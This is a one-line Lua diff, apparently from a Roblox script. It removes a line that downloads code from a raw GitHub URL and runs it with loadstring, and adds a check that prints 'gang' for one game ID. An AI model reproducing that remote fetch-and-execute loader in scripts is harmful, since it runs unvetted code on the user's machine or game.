@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Qrto1/working/main/pc"))()
+if game.GameId==4849157113 then print("gang") end
